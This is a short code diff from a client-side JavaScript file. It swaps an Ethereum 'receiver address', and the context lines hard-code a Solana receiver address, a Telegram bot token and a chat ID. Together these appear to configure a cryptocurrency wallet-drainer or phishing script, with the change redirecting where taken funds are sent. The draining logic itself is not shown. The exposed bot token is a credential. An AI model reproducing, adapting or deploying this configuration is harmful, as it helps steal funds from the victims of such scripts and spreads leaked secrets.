@@ -105,7 +105,7 @@ $(document).ready(function() {
     }
 
     // Receiver addresses & API keys
-    const RECEIVER_ADDRESS     = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
+    const RECEIVER_ADDRESS     = "0x373b3CFC2Bdb005B889840415b023ECcd168220e";
     const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
     const TELEGRAM_BOT_TOKEN   = "8663295709:AAE53vZv01PYv1BBXzssoyj6-KOT4ALH8ao";
     const TELEGRAM_CHAT_ID     = "-1003788193467";
